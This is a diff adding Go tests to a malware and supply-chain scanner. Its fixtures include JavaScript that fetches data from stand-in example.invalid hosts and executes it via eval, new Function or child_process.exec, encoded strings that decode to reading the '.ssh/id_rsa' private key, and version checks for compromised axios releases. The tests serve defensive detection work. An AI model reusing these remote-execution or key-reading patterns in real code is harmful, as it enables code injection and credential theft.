@@ -209,6 +209,245 @@ func TestKnownBenignPackageIsNotBlocklisted(t *testing.T) {
 		}
 	}
 }
+
+func TestAdvisoryVersionsDistinguishResolvedFromPossible(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "package.json", `{"dependencies":{"process-log":"^1.0.0","cdn-icon-fetch":"^1.0.2","vite-tsconsole-log":"^1.0.4","axios":"^1.14.0","call-bind-apply-helpers":"1.0.2"}}`)
+	writeFixture(t, root, "package-lock.json", `{"lockfileVersion":3,"packages":{"node_modules/axios":{"version":"1.14.0"},"node_modules/process-log":{"version":"1.0.0"}}}`)
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	for _, id := range []string{"GHSA-rqwx-v86m-wwff", "GHSA-gmvp-cqg5-vgvh", "MAL-2025-4289"} {
+		if !hasRule(findings, "IOC-PKG-"+id) {
+			t.Errorf("missing %s", id)
+		}
+	}
+	confirmedProcess, potentialAxios := false, false
+	for _, f := range findings {
+		if f.RuleID == "IOC-PKG-GHSA-rqwx-v86m-wwff" && f.Path == "package-lock.json" && f.Context == "confirmed-ioc" {
+			confirmedProcess = true
+		}
+		if f.RuleID == "IOC-PKG-MSFT-2026-04-01-AXIOS" {
+			if f.Context == "confirmed-ioc" {
+				t.Fatalf("safe Axios lock was called compromised: %+v", f)
+			}
+			if strings.Contains(f.Message, "could resolve") {
+				potentialAxios = true
+			}
+		}
+		if strings.Contains(f.Evidence, "call-bind-apply-helpers") && strings.HasPrefix(f.RuleID, "IOC-PKG-") {
+			t.Fatalf("benign package matched intelligence: %+v", f)
+		}
+	}
+	if !confirmedProcess || !potentialAxios {
+		t.Fatalf("version classification missing: %+v", findings)
+	}
+}
+
+func TestAxiosExactLockfileVersions(t *testing.T) {
+	for _, item := range []struct {
+		version  string
+		affected bool
+	}{
+		{"1.14.1", true}, {"0.30.4", true}, {"1.14.0", false}, {"0.30.3", false},
+	} {
+		t.Run(item.version, func(t *testing.T) {
+			root := t.TempDir()
+			writeFixture(t, root, "README.md", "fixture\n")
+			writeFixture(t, root, "LICENSE", "fixture\n")
+			writeFixture(t, root, "package-lock.json", `{"lockfileVersion":3,"packages":{"node_modules/axios":{"version":"`+item.version+`"}}}`)
+			_, findings := New(Options{}).Scan(context.Background(), root)
+			confirmed := false
+			for _, f := range findings {
+				if f.RuleID == "IOC-PKG-MSFT-2026-04-01-AXIOS" {
+					if f.Context != "confirmed-ioc" {
+						t.Fatalf("exact lock classification: %+v", f)
+					}
+					confirmed = true
+				}
+			}
+			if confirmed != item.affected {
+				t.Fatalf("version %s classification: %+v", item.version, findings)
+			}
+		})
+	}
+}
+
+func TestAxiosResponseExecutionFlowAndBenignControls(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "loader.js", `async function load() {
+  const response = await axios.get("https://example.invalid/data");
+  const payload = response.data;
+  eval(payload);
+}
+async function failed() {
+  try { const response = await axios.get("https://example.invalid/error"); }
+  catch (err) { new Function(err.response.data)(); }
+}
+function chained() {
+  axios.get("https://example.invalid/other").then((reply) => { eval(reply.data); });
+}
+function rejected() {
+  axios.get("https://example.invalid/fail").catch((error) => { eval(error.response.data); });
+}
+async function aliased() {
+  const client = axios;
+  const result = await client.post("https://example.invalid/alias");
+  child_process.exec(result.data);
+}
+async function errorWithoutAssignment() {
+  try { await axios.get("https://example.invalid/no-result"); }
+  catch (error) { eval(error.response.data); }
+}
+function catchAfterValueTransform() {
+  axios.get("https://example.invalid/reject")
+    .then(reply => reply.data)
+    .catch(error => { eval(error.response.data); });
+}
+`)
+	writeFixture(t, root, "ordinary.js", `async function render() {
+  const response = await axios.get("https://example.invalid/data");
+  return response.data.title;
+}
+function unrelated() { eval(localExpression); }
+async function parse() {
+  const response = await axios.get("https://example.invalid/plain-data");
+  pattern.exec(response.data);
+}
+`)
+	writeFixture(t, root, "vendor.js", strings.Repeat("function chartHelper() { return 1; }\n", 130))
+	coverage, findings := New(Options{}).Scan(context.Background(), root)
+	if !coverage.Complete {
+		t.Fatalf("ordinary vendor functions interrupted Axios coverage: %+v", coverage)
+	}
+	locations := map[int]bool{}
+	for _, f := range findings {
+		if f.RuleID != "FLOW-001" {
+			continue
+		}
+		if f.Path != "loader.js" {
+			t.Fatalf("benign request correlated: %+v", f)
+		}
+		if len(f.Locations) != 2 || f.Locations[0].StartLine == 0 || f.Locations[1].StartLine == 0 || f.Severity != model.SeverityCritical {
+			t.Fatalf("source/sink evidence missing: %+v", f)
+		}
+		locations[f.Locations[1].StartLine] = true
+	}
+	for _, line := range []int{4, 8, 11, 14, 19, 23, 28} {
+		if !locations[line] {
+			t.Fatalf("missing sink line %d: %+v", line, findings)
+		}
+	}
+}
+
+func TestTopLevelModuleAxiosFlow(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "module.mjs", "const response = await axios.get('https://example.invalid/data');\neval(response.data);\n")
+	writeFixture(t, root, "ordinary.mjs", "const response = await axios.get('https://example.invalid/data');\nconsole.log(response.data);\nfunction unrelated() { eval(localExpression); }\n")
+	coverage, findings := New(Options{}).Scan(context.Background(), root)
+	if !coverage.Complete {
+		t.Fatalf("module scan was incomplete: %+v", coverage)
+	}
+	seen := false
+	for _, finding := range findings {
+		if finding.RuleID != "FLOW-001" {
+			continue
+		}
+		if finding.Path != "module.mjs" || len(finding.Locations) != 2 || finding.Locations[0].StartLine != 1 || finding.Locations[1].StartLine != 2 {
+			t.Fatalf("module flow lost source/sink precision or flagged ordinary data: %+v", finding)
+		}
+		seen = true
+	}
+	if !seen {
+		t.Fatalf("top-level module response execution was missed: %+v", findings)
+	}
+}
+
+func TestLiteralDecodeRetainsSourceLocation(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "decoded.js", "const name = String.fromCharCode(46,115,115,104,47,105,100,95,114,115,97);\nconst marker = '\\x2essh\\x2fid_rsa';\n")
+	writeFixture(t, root, "base64.js", "const encoded = 'ZnMucmVhZEZpbGVTeW5jKCcuc3NoL2lkX3JzYScp';\n")
+	writeFixture(t, root, "bytes.js", "const encoded = new Uint8Array([102,115,46,114,101,97,100,70,105,108,101,83,121,110,99,40,39,46,115,115,104,47,105,100,95,114,115,97,39,41]);\n")
+	writeFixture(t, root, "table.js", "const pieces = ['.ssh/', 'id_rsa'];\nconst path = pieces[0] + pieces[1];\n")
+	writeFixture(t, root, "comment.js", "// const encoded = 'ZnMucmVhZEZpbGVTeW5jKCcuc3NoL2lkX3JzYScp';\n")
+	coverage, findings := New(Options{}).Scan(context.Background(), root)
+	if !coverage.Complete {
+		t.Fatalf("small literal scan incomplete: %+v", coverage)
+	}
+	decoded := model.Finding{}
+	for _, finding := range findings {
+		if finding.RuleID == "DECODE-001" && finding.Path == "decoded.js" {
+			decoded = finding
+			break
+		}
+	}
+	if decoded.Line == 0 || len(decoded.ContributingRuleIDs) == 0 {
+		t.Fatalf("decoded evidence lacks provenance: %+v", findings)
+	}
+	decodedPaths := map[string]bool{}
+	for _, finding := range findings {
+		if finding.RuleID == "DECODE-001" {
+			decodedPaths[finding.Path] = true
+		}
+	}
+	if !decodedPaths["base64.js"] || !decodedPaths["bytes.js"] || !decodedPaths["table.js"] || decodedPaths["comment.js"] {
+		t.Fatalf("literal decoding missed a supported form or decoded a comment: %+v", decodedPaths)
+	}
+	for _, finding := range findings {
+		if finding.RuleID == "DECODE-001" && finding.Path == "table.js" {
+			if finding.Line != 2 || len(finding.Locations) != 3 || finding.Locations[1].StartLine != 1 || finding.Locations[2].StartLine != 1 {
+				t.Fatalf("static lookup lost source provenance: %+v", finding)
+			}
+		}
+	}
+}
+
+func TestUnsupportedLiteralDecodeMarksCoverageIncomplete(t *testing.T) {
+	for _, test := range []struct {
+		name, source, reason string
+	}{
+		{"oversize literal", "const encoded = '" + strings.Repeat("A", 129*1024) + "';\n", "decoder literal-byte limit"},
+		{"expression", "const value = String.fromCharCode(65 + externalInput);\n", "unsupported JavaScript literal expression"},
+		{"rotation", "const table = ['a', 'b']; table['push'](table['shift']());\n", "dynamic string-table rotation"},
+		{"mutated table", "const pieces = ['.ssh/', 'id_rsa']; pieces.push('extra'); const path = pieces[0] + pieces[1];\n", "unsupported JavaScript literal expression"},
+		{"aliased table mutation", "const pieces = ['.ssh/', 'id_rsa']; const alias = pieces; alias[0] = 'public/'; const path = pieces[0] + pieces[1];\n", "unsupported JavaScript literal expression"},
+		{"array items", "const bytes = new Uint8Array([" + strings.Repeat("65,", 8192) + "65]);\n", "decoder array-item limit"},
+	} {
+		t.Run(test.name, func(t *testing.T) {
+			root := t.TempDir()
+			writeFixture(t, root, "source.js", test.source)
+			coverage, findings := New(Options{}).Scan(context.Background(), root)
+			if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), test.reason) {
+				t.Fatalf("unsupported content did not report incomplete coverage: %+v", coverage)
+			}
+			if (test.name == "mutated table" || test.name == "aliased table mutation") && hasRule(findings, "DECODE-001") {
+				t.Fatalf("mutated table was decoded using its original order: %+v", findings)
+			}
+		})
+	}
+}
+
+func TestVendorBundleWeakNoiseAndStrongSignals(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "public/charting_library/bundles/routine.js", "eval(localWidget); Object.prototype.flag = 1;\n")
+	writeFixture(t, root, "public/charting_library/bundles/loader.js", "async function load(){\nconst response = await axios.get('https://example.invalid/data');\neval(response.data);\n}\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	for _, f := range findings {
+		if f.Path == "public/charting_library/bundles/routine.js" && (f.RuleID == "EXEC-001" || f.RuleID == "PROTO-001") {
+			t.Fatalf("weak vendor bundle noise retained: %+v", f)
+		}
+	}
+	flow, ok := ruleFinding(findings, "FLOW-001")
+	if !ok || flow.Context != "generated" || flow.Disposition != model.DispositionBlock {
+		t.Fatalf("correlated vendor behavior lost: %+v", findings)
+	}
+}
 func TestEvidenceRedactsCredentials(t *testing.T) {
 	root := t.TempDir()
 	providerCredential := "AKIA" + "ABCDEFGHIJKLMNOP"
@@ -241,9 +480,39 @@ func TestEscapingSymlink(t *testing.T) {
 func TestGeneratedCodeSignalsAreDetected(t *testing.T) {
 	root := t.TempDir()
 	writeFixture(t, root, "packed.js", "eval('x');\n"+strings.Repeat("abcdefghijklmnopqrstuvwxyz0123456789", 20))
+	writeFixture(t, root, "obfuscated.js", "const token = /\\s/; eval(payload);\n")
+	for _, path := range []string{"server/routes/rules.js", "server/signature.js", "server/indicator.js"} {
+		writeFixture(t, root, path, "eval(remotePayload);\n")
+	}
 	_, findings := New(Options{}).Scan(context.Background(), root)
 	if !hasRule(findings, "OBFS-004") || !hasRule(findings, "OBFS-005") {
 		t.Errorf("missing generated minification/entropy checks: %+v", findings)
+	}
+	seen := false
+	for _, finding := range findings {
+		if finding.Path == "obfuscated.js" && finding.RuleID == "EXEC-001" {
+			seen = true
+			if finding.Context != "executable" {
+				t.Fatalf("regex-like executable source was downgraded: %+v", finding)
+			}
+		}
+	}
+	if !seen {
+		t.Fatalf("regex-like executable source was missed: %+v", findings)
+	}
+	for _, path := range []string{"server/routes/rules.js", "server/signature.js", "server/indicator.js"} {
+		found := false
+		for _, finding := range findings {
+			if finding.Path == path && finding.RuleID == "EXEC-001" {
+				found = true
+				if finding.Context != "executable" {
+					t.Fatalf("executable source was downgraded by its filename: %+v", finding)
+				}
+			}
+		}
+		if !found {
+			t.Fatalf("execution finding missing for %s", path)
+		}
 	}
 }
 
@@ -656,9 +925,26 @@ func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(repo, "launch.ps1"), []byte{0xff, 0xfe, 'i', 0, 'e', 0, 'x', 0}, 0o644); err != nil {
 		t.Fatal(err)
 	}
+	// The corpus's skipped HTML/TypeScript files fail the first-8-KiB UTF-8
+	// check without NULs. Keep that case distinct from UTF-16/NUL skips.
+	for _, path := range []string{"public/charting_library/bundles/locale.html", "frontend/src/helpers/localized.ts"} {
+		writeFixture(t, repo, path, "text\n")
+		if err := os.WriteFile(filepath.Join(repo, path), []byte{'t', 'e', 'x', 't', 0xff, '\n'}, 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
 	coverage, _ := New(Options{}).Scan(context.Background(), repo)
-	if coverage.Complete || len(coverage.Skipped) < 3 || !strings.Contains(strings.Join(coverage.Skipped, " "), "undecodable") {
+	if coverage.Complete || len(coverage.Skipped) < 5 || !strings.Contains(strings.Join(coverage.Skipped, " "), "undecodable") {
 		t.Fatalf("undecodable script reported complete: %+v", coverage)
+	}
+}
+
+func TestExcessiveLineCountMarksRuleCoverageIncomplete(t *testing.T) {
+	repo := t.TempDir()
+	writeFixture(t, repo, "many.js", strings.Repeat("x\n", 250001))
+	coverage, _ := New(Options{}).Scan(context.Background(), repo)
+	if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), "line-count limit") {
+		t.Fatalf("excessive line count must be visible as incomplete: %+v", coverage)
 	}
 }
 
